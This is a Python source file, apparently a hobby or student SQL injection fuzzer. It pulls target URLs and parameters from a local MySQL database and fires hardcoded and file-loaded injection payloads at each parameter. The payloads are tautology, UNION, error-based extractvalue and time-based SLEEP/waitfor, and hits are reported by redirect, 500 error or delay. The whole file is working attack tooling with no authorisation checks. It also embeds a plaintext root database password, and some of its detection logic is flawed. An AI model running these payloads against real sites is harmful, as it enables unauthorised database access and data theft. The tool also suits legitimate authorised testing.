import requests
import mysql.connector
import time
from urllib.parse import parse_qs
import json
from colorama import init, Fore, Style


class SqlInjection:
    def __init__(self):

        self.payload = {
            "simple": ["' OR '1'='1",
                       "' OR '1'='1';--",
                       "%27%20oR%20%271%27%20=%20%271",
                       "*",
                       "1 ASC", # SELECT * FROM ~ ORDER BY {}
                       "1", # SELECT * FROM ~ ORDER BY {} ASC
                       "%/**/%",
                       "%' AND 8310=8310 AND '%'=",
                       "''",
                       "\"\""],

            "union": ["' UNION SELECT NULL; --",
                      "' UNION SELECT NULL, NULL; --",
                      "'UNION ALL SELECT 1",
                      "' UNION SELECT 1 FROM information_schema.tables WHERE '1'='1';--",
                      "%27%20UNION/**/SELECT%20NULL,NULL,NULL%23"],

            "error": ["SELECT extractvalue(1, ConCat(0x3a, 'Fuzzingzzing'));",
                      "1+and+(select 1)=(select 0x414141414141441414141414114141414141414141414141414141414141414141.)+union+select+extractvalue(1, concat(0x3a, 'Fuzzingzzing'));--",
                      "Fuzzingzzing", # SELECT * FROM {} ~
                      "AS Fuzzingzzing WHERE 1=1 AND 1=1",
                      "1%20and%20%28select%201%29%3D%28select%200x414141414141441414141414114141414141414141414141414141414141414141%29%20union%20select%20extractvalue%281%2C%20concat%280x3a%2C%20%27Fuzzingzzing%27%29%29%3B--",
                      "ORDER BY 10000",
                      "AS Fuzzingzzingi WHERE 1=1 AND 1=1",
                      "' UNION SELECT extractvalue(1, concat(0x3a, 'Fuzzingzzing'));--",
                      "' OR 1=CONCAT('Fuzzingzzing',(SELECT table_name FROM information_schema.tables LIMIT 1))--",
                      "HAVING 1=0"],

            "time": ["' OR SLEEP(5); --",
                     "\") SLEEP(5); --",
                     "%27%20oR%27%20Sl%eEp(5); --",
                     "') sle%EP(5); --",
                     "' && Slee%P(5); -- ",
                     "';waitfor delay '0:0:5'--",
                     "\"';waitfor delay '0:0:5'--",
                     "';waitfor delay '0:0:5'--",
                     "%27%3Bwaitfor%20delay%20%270%3A0%3A5%27--",
                     "%27%3BwAitFor%20dElAy%20%270%3A0%3A5%27--"]
        }

        self.file_simple = open('./payloads/SQL Injection/simple_payload.txt', 'r')
        self.file_blind = open('./payloads/SQL Injection/blind_payload.txt', 'r')
        self.file_union = open('./payloads/SQL Injection/union_payload.txt', 'r')
        self.file_time = open('./payloads/SQL Injection/time_payload.txt', 'r')
        self.file_error = open('./payloads/SQL Injection/error_payload.txt', 'r')

        # self.file_column = open('./payloads/SQL Injection/error_payload.txt', 'r')
        # self.file_orderby = open('./payloads/SQL Injection/error_payload.txt', 'r')

        self.connection = None
        self.cursor = None

    # def check_db(self):
        # 우선 Mysql, MongoDB, SQLite 를 중점으로

    def close_file(self):
        self.file_blind.close()
        self.file_union.close()
        self.file_time.close()
        self.file_error.close()
        self.file_simple.close()

    def get_url(self):
        url_list = []

        try:
            self.connection = mysql.connector.connect(
                host="127.0.0.1",
                database="Fuzzingzzingii",
                user="root",
                password="skawjddns123@"
            )
            if self.connection.is_connected():
                self.cursor = self.connection.cursor()

                self.cursor.execute(f'SELECT url FROM collected_urls;')
                result = self.cursor.fetchall()

                for url in result:
                    url_list.append(url[0])

        except Exception as e:
            print(f"SQL connect error : {e} ")

        return url_list

    def get_params(self, url):
        result = []

        self.cursor.execute('SELECT method, parameters FROM requests WHERE url=%s', (url,))
        result = self.cursor.fetchall()

        return result

    def get_payloads(self):
        payloads_simple = self.file_simple.readlines()
        payloads_union = self.file_union.readlines()
        payloads_error = self.file_error.readlines()
        payloads_blind = self.file_blind.readlines()
        payloads_time = self.file_time.readlines()

        return payloads_simple, payloads_union, payloads_error, payloads_blind, payloads_time

    # SQLI 유형 체크
    def checksqli_simple(self, url, method, param):
        # simple
        if param:
            param = parse_qs(param)

            for simple in self.payload['simple']:
                for key in param:
                    param[key] = simple

                    if method == 'GET':
                        resp = requests.get(url, params=param, allow_redirects=True)
                        if resp.is_redirect:
                            return url, method, param

                    elif method == 'POST':
                        resp = requests.post(url, data=param, allow_redirects=True)
                        if resp.is_redirect:
                            return url, method, param

        return False

    def checksqli_union(self, url, method, param):
        # union
        if param:
            param = parse_qs(param)

            for union_base in self.payload['union']:
                for key in param:
                    param[key] = union_base

                    if method == 'GET':
                        resp = requests.get(url, params=param, allow_redirects=True)
                        if resp.is_redirect:
                            return url, method, param


                    elif method == 'POST':
                        resp = requests.post(url, data=param, allow_redirects=True)
                        if resp.is_redirect:
                            return url, method, param

        return False

    # blind는 error based, time based 페이로드가 실행되면 가능한 것으로 판별
    def checksqli_error(self, url, method, param):
        # error based
        if param:
            param = parse_qs(param)

            for error_base in self.payload['error']:
                for key in param:
                    param[key] = error_base

                    if method == 'GET':
                        resp = requests.get(url, params=param, allow_redirects=True)
                        if resp.status_code == 500 and 'Fuzzingzzing' in resp.text:
                            return url, method, param

                    elif method == 'POST':
                        resp = requests.post(url, data=param, allow_redirects=True)
                        if resp.status_code == 500 and 'Fuzzingzzing' in resp.text:
                            return url, method, param

        return False

    def checksqli_time(self, url, method, param):
        # time based
        if param:
            param = parse_qs(param)

            for time_base in self.payload['time']:
                for key in param:
                    param[key] = time_base

                # Sleep(5)가 되면 True
                    if method == 'GET':
                        start_time = time.time()
                        resp = requests.get(url, params=param, allow_redirects=True)
                        end_time = time.time() - start_time
                        if int(end_time) >= 5:
                            return url, method, param

                    elif method == 'POST':
                        start_time = time.time()
                        resp = requests.post(url, data=param, allow_redirects=True)
                        end_time = time.time() - start_time
                        if int(end_time) >= 5:
                            return url, method, param

        return False
    def execute_simple(self, url, method, param, payloads):
        init()
        simple_result = self.checksqli_simple(url, method, param)
        if simple_result:
            url_simple, method_simple, param_simple = simple_result

            for payload_simple in payloads:
                payload_simple = payload_simple.strip()
                for key in param_simple:
                    param_simple[key] = payload_simple

                    if method == 'GET':
                        resp = requests.get(url, params=param_simple, allow_redirects=True)
                        if resp.is_redirect:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}SIMPLE PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_simple}\t PAYLOAD : {payload_simple}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}SIMPLE PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_simple}\t PAYLOAD : {payload_simple}\t RESULT : FALSE")

                    elif method == 'POST':
                        resp = requests.post(url, data=param_simple, allow_redirects=True)
                        if resp.is_redirect:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}SIMPLE PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_simple}\t PAYLOAD : {payload_simple}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}SIMPLE PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_simple}\t PAYLOAD : {payload_simple}\t RESULT : FALSE")

        else:
            print(f"{Style.BRIGHT}{Fore.BLUE}SIMPLE PAYLOAD DOESN'T WORKS{Style.RESET_ALL}")

    def execute_union(self, url, method, param, payloads):
        init()
        union_result = self.checksqli_union(url, method, param)
        if union_result:
            url_union, method_union, param_union = union_result

            for payload_union in payloads:
                payload_union = payload_union.strip()
                for key in param_union:
                    param_union[key] = payload_union

                    if method == 'GET':
                        resp = requests.get(url, params=param_union, allow_redirects=True)
                        if resp.is_redirect:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}UNION PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_union}\t PAYLOAD : {payload_union}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}UNION PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_union}\t PAYLOAD : {payload_union}\t RESULT : FALSE")

                    elif method == 'POST':
                        resp = requests.post(url, data=param_union, allow_redirects=True)
                        if resp.is_redirect:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}UNION PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_union}\t PAYLOAD : {payload_union}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}UNION PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_union}\t PAYLOAD : {payload_union}\t RESULT : FALSE")

        else:
            print(f"{Style.BRIGHT}{Fore.BLUE}UNION_BASED PAYLOAD DOESN'T WORKS{Style.RESET_ALL}")

    def execute_error(self, url, method, param, payloads_error, payloads_blind):
        init()
        error_result = self.checksqli_error(url, method, param)
        if error_result:
            url_error, method_error, param_error = error_result

            for payload_error in payloads_error:
                payload_error = payload_error.strip()
                for key in param_error:
                    param_error[key] = payload_error

                    if method == 'GET':
                        resp = requests.get(url, params=param_error, allow_redirects=True)
                        if resp.status_code == 500 and 'Fuzzingzzing' in resp.text:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}ERROR PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_error}\t PAYLOAD : {payloads_error}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}ERROR PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_error}\t PAYLOAD : {payloads_error}\t RESULT : FALSE")

                    elif method == 'POST':
                        resp = requests.post(url, data=param_error, allow_redirects=True)
                        if resp.status_code == 500 and 'Fuzzingzzing' in resp.text:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}ERROR PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_error}\t PAYLOAD : {payloads_error}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}ERROR PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_error}\t PAYLOAD : {payloads_error}\t RESULT : FALSE")

                            # 이 부분도 애매해서 이후에 한번 더 봐야 할 듯

            for payload_blind in payloads_blind:
                payload_blind = payload_blind.strip()
                for key in param_error:
                    param_error[key] = payload_blind

                    if method == 'GET':
                        resp = requests.get(url, params=param_error, allow_redirects=True)
                        if resp.status_code == 200 and not resp.is_redirect:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}BLIND PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_error}\t PAYLOAD : {payload_blind}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}BLIND PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_error}\t PAYLOAD : {payload_blind}\t RESULT : FALSE")

                    elif method == 'POST':
                        resp = requests.post(url, data=param_error, allow_redirects=True)
                        if resp.status_code == 200 and not resp.is_redirect:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}BLIND PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_error}\t PAYLOAD : {payload_blind}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}BLIND PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_error}\t PAYLOAD : {payload_blind}\t RESULT : FALSE")

        else:
            print(f"{Style.BRIGHT}{Fore.BLUE}ERROR_BASED PAYLOAD DOESN'T WORKS{Style.RESET_ALL}")

    def execute_time(self, url, method, param, payloads_time, payloads_blind):
        init()
        time_result = self.checksqli_time(url, method, param)
        if time_result:
            url_time, method_time, param_time = time_result

            for payload_time in payloads_time:
                payload_time = payload_time.strip()
                for key in param_time:
                    param_time[key] = payload_time

                    # Sleep(5)가 되면 True
                    if method == 'GET':
                        start_time = time.time()
                        resp = requests.get(url, params=param_time, allow_redirects=True)
                        end_time = time.time() - start_time
                        if int(end_time) >= 5:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}TIME PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_time}\t PAYLOAD : {payload_time}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}TIME PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_time}\t PAYLOAD : {payload_time}\t RESULT : FALSE")

                    elif method == 'POST':
                        start_time = time.time()
                        resp = requests.post(url, data=param_time, allow_redirects=True)
                        end_time = time.time() - start_time
                        if int(end_time) >= 5:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}TIME PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_time}\t PAYLOAD : {payload_time}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}TIME PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_time}\t PAYLOAD : {payload_time}\t RESULT : FALSE")

            for payload_blind in payloads_blind:
                payload_blind = payload_blind.strip()
                for key in param_time:
                    param_time[key] = payload_blind

                    if method == 'GET':
                        resp = requests.get(url, params=param_time, allow_redirects=True)
                        if resp.status_code == 200 and not resp.is_redirect:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}BLIND PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_time}\t PAYLOAD : {payload_blind}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}BLIND PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_time}\t PAYLOAD : {payload_blind}\t RESULT : FALSE")

                    elif method == 'POST':
                        resp = requests.post(url, data=param_time, allow_redirects=True)
                        if resp.status_code == 200 and not resp.is_redirect:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}BLIND PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_time}\t PAYLOAD : {payload_blind}\t RESULT : TRUE")
                        else:
                            print(f"{Style.BRIGHT}{Fore.BLUE}SQL INJECTION{Fore.RED}BLIND PAYLOAD{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param_time}\t PAYLOAD : {payload_blind}\t RESULT : FALSE")
        else:
            print(f"{Style.BRIGHT}{Fore.BLUE}TIME_BASED PAYLOAD DOESN'T WORKS{Style.RESET_ALL}")

    def execute_injection(self, url, method, param, payloads_simple, payloads_union, payloads_blind, payloads_error, payloads_time):
        self.execute_simple(url, method, param, payloads_simple)
        self.execute_union(url, method, param, payloads_union)
        self.execute_error(url, method, param, payloads_error, payloads_blind)
        self.execute_time(url, method, param, payloads_time, payloads_blind)

